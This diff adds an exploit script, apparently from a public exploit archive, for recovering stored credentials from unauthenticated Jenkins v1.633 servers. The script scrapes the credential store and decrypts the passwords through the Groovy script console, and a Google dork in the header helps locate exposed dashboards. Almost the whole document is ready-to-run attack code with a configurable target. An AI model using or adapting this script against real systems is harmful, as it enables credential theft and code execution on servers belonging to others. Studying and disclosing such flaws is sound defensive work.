@@ -1,0 +1,60 @@
+# Exploit Title: Jenkins Unauthenticated Credential Recovery
+# Disclosure Date: 10/14/2015
+# Response Date: 10/14/2015
+# Response: "Recommend this be rejected as a vulnerability."
+# Full report including response: http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html
+# Vendor Homepage: https://jenkins-ci.org/
+# Tested on: Jenkins v1.633
+# Author = 'Th3R3p0' | Justin Massey
+# Google Dork: intitle:"Dashboard [Jenkins]" Credentials
+
+import requests
+import re
+from BeautifulSoup import BeautifulSoup
+import urllib
+
+
+# Usage: Modify the URL below to match the target host and port
+#   Must have trailing slash at end of URL
+url='http://192.168.1.151:8080/'
+
+# makes request to gather all users with stored credentials
+r= requests.get(url + 'credential-store/domain/_/')
+soup = BeautifulSoup(r.text)
+
+# loop to go through all hrefs and match the regex "credential" and add the urls to the users list
+users = []
+for link in soup.body.findAll('a', href=True):
+    m = re.match("credential", link['href'])
+    if m:
+        if link['href'] not in users:
+            users.append(link['href'])
+
+for users in users:
+    r2 = requests.get(url + 'credential-store/domain/_/'+users+'/update')
+    soup2 = BeautifulSoup(r2.text)
+
+    # Finds the user and password value in html and stores in encPass variable
+    user = soup2.body.findAll(attrs={"name" : "_.username"})[0]['value']
+    encPass = soup2.body.findAll(attrs={"name" : "_.password"})[0]['value']
+    # Encodes the password to www-form-urlencoded standards needed for the expected content type
+    encPassEncoded = urllib.quote(encPass, safe='')
+
+    # Script to run in groovy scripting engine to decrypt the password
+    script = 'script=hudson.util.Secret.decrypt+%%27' \
+             '%s'\
+             '%%27&json=%%7B%%22script%%22%%3A+%%22hudson.util.Secret.decrypt+%%27' \
+             '%s' \
+             '%%27%%22%%2C+%%22%%22%%3A+%%22%%22%%7D&Submit=Run' % (encPassEncoded, encPassEncoded)
+
+    # Using sessions because the POST requires a session token to be present
+    with requests.Session() as s:
+        r3 = s.get(url+'script')
+        headers = {'content-type': 'application/x-www-form-urlencoded'}
+        r3 = s.post(url+'script',data=script, headers=headers)
+    soup3 = BeautifulSoup(r3.text)
+
+    # Extracts password from body
+    password = soup3.body.findAll('pre')[1].text
+    password = re.sub('Result:', '', password)
+    print "User: %s | Password:%s" % (user, password)
